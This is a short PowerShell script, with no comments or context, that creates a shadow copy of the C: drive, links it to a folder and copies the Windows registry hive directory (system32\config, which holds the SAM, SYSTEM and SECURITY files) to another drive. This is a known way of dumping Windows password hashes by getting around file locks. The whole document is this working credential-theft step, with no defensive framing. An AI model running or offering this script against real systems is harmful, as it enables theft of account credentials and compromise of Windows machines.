﻿$syslink1 = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\\", "ClientAccessible")
$syslink2 = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $syslink1.ShadowID }
$directory = $syslink2.DeviceObject + "\\"
cmd /c mklink /d C:\shadowcopy "$directory"
copy-item -path "C:\shadowcopy\windows\system32\config" -destination "D:\" -Recurse